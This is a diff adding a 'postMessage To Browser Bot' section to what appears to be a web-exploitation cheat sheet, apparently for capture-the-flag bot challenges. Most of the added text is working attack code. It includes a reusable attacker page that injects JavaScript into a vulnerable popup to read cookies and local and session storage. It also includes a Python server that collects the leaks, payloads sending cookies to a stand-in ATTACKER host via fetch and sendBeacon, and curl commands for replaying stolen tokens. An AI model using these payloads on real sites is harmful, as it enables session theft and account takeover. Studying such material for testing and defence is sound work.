@@ -96,6 +96,140 @@ Sinks: innerHTML, outerHTML, insertAdjacentHTML, document.write, eval, setTimeou
 Search: innerHTML|insertAdjacentHTML|document.write|eval|postMessage|location.hash|window.name
 ```
 
+## postMessage To Browser Bot
+
+Use when public JS has a message listener that accepts all origins and exposes privileged actions like `execute`, `eval`, `render`, `debug`, `admin`, etc.
+
+Things to check:
+
+```js
+window.addEventListener("message", (event) => {
+  // bad if no event.origin allowlist
+  // bad if hidden action reaches eval / Function / AsyncFunction / fetch / DOM sinks
+});
+```
+
+If a bot cookie is `SameSite=Lax`, embedding the target in an attacker iframe may not expose `document.cookie`. Open the vulnerable page as a top-level popup instead, then send `postMessage` to the popup. Top-level navigation makes Lax cookies available.
+
+Reusable attacker page:
+
+```html
+<!doctype html>
+<script>
+const TARGET = "http://target.local";
+const VULN_PATH = "/vulnerable-frame-or-page.html";
+const CHANNEL = "CHANGE_ME";
+const MSG_TYPE = "execute";
+
+const popup = open(TARGET + VULN_PATH, "x");
+
+function send() {
+  if (!popup || popup.closed) return;
+  popup.postMessage({
+    channel: CHANNEL,
+    type: MSG_TYPE,
+    id: Date.now(),
+    // Change `code` to whatever field the target expects.
+    // Examples: js, script, source, html with <img onerror=...>, etc.
+    code: `
+      try {
+        opener.postMessage({
+          kind: "leak",
+          origin: location.origin,
+          url: location.href,
+          cookie: document.cookie,
+          localStorage: JSON.stringify(localStorage),
+          sessionStorage: JSON.stringify(sessionStorage)
+        }, "*");
+      } catch (e) {}
+    `
+  }, "*");
+}
+
+setInterval(send, 500);
+addEventListener("message", e => {
+  fetch("/leak", {
+    method: "POST",
+    headers: {"content-type": "application/json"},
+    body: JSON.stringify(e.data)
+  });
+});
+</script>
+```
+
+Minimal Python leak server:
+
+```python
+#!/usr/bin/env python3
+import json
+from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
+
+ATTACK_HTML = open("attack.html", "rb").read()
+
+class H(BaseHTTPRequestHandler):
+    def do_GET(self):
+        self.send_response(200)
+        self.send_header("content-type", "text/html")
+        self.end_headers()
+        self.wfile.write(ATTACK_HTML)
+
+    def do_POST(self):
+        n = int(self.headers.get("content-length", "0"))
+        body = self.rfile.read(n)
+        try:
+            print(json.dumps(json.loads(body), indent=2), flush=True)
+        except Exception:
+            print(body.decode(errors="replace"), flush=True)
+
+        self.send_response(204)
+        self.end_headers()
+
+ThreadingHTTPServer(("0.0.0.0", 8000), H).serve_forever()
+```
+
+Useful payloads for the message `code` field:
+
+```js
+// Exfil readable browser state
+opener.postMessage({
+  cookie: document.cookie,
+  ls: JSON.stringify(localStorage),
+  ss: JSON.stringify(sessionStorage)
+}, "*")
+
+// Read same-origin endpoint, then exfil
+fetch("/admin")
+  .then(r => r.text())
+  .then(t => opener.postMessage({admin: t}, "*"))
+
+// Make credentialed same-origin action
+fetch("/api/action", {
+  method: "POST",
+  headers: {"content-type": "application/json"},
+  body: JSON.stringify({x: 1})
+})
+
+// If exfil by postMessage fails, use network exfil
+fetch("https://ATTACKER/leak", {method: "POST", mode: "no-cors", body: document.cookie})
+navigator.sendBeacon("https://ATTACKER/leak", document.cookie)
+```
+
+Follow-up patterns:
+
+```bash
+# Replay leaked non-HttpOnly cookie/token server-side
+curl 'http://target.local/interesting-endpoint' \
+  -H 'Cookie: NAME=VALUE' \
+  -H 'X-Token: VALUE'
+
+# Submit attack page to bot
+curl 'http://target.local/report' \
+  -H 'content-type: application/x-www-form-urlencoded' \
+  --data 'url=https://ATTACKER/'
+```
+
+If CSP blocks inline/script fetches, also try app error paths. Oversized body/path errors sometimes lose the app CSP, but this is optional if `postMessage` already gives first-party JS execution.
+
 ## Mutation XSS
 
 [https://portswigger.net/research/bypassing-dompurify-again-with-mutation-xss ](https://portswigger.net/research/bypassing-dompurify-again-with-mutation-xss)
